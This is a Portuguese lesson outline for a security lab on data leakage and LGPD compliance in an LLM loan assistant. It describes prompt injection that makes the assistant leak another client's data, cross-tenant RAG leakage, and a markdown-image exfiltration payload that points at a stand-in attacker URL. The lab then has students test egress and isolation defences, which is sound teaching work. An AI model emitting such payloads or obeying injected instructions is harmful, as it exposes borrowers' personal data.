# Aula 4 — Dados e privacidade / LGPD (prática)

**Objetivo:** ver os dois canais de vazamento (pelos **pesos** × pelo **contexto vivo**) e as implicações de **LGPD** num sistema que trata PII de tomadores de empréstimo.

## O que explorar na plataforma

- **PII na origem:** o chat coleta nome, CPF, renda — dado pessoal sensível.
- **Exfiltração via contexto:** injeção que faz o assistente vazar dados de outro cliente (combina LLM01 + LLM02).
- **Exfiltração via imagem-markdown:** resposta que embute `![](http://atacante/log?dados=...)`.
- **RAG entre tenants:** rodar 2 instâncias (financeiras diferentes) e provar vazamento se o controle de acesso falhar.
- **Dados a terceiros:** PII enviada às **APIs de fornecedores** e por **e-mail** → transferência internacional / retenção.
- **LGPD:** base legal, minimização, direito de exclusão (tensão com memorização), RIPD.

## O que o aluno faz

1. Dispara cada vazamento com a defesa OFF.
2. Liga filtro de egress / isolamento por tenant / minimização e confirma a contenção.
3. Preenche um mini-checklist LGPD sobre a CredSim.

## Arquivos

- `privacidade_lgpd.ipynb` — exfiltração (contexto, imagem-markdown), RAG multi-tenant, egress; checklist LGPD.

> Riscos: LLM02, LLM08. Conecta com Aula 5 (filtro de saída, isolamento).
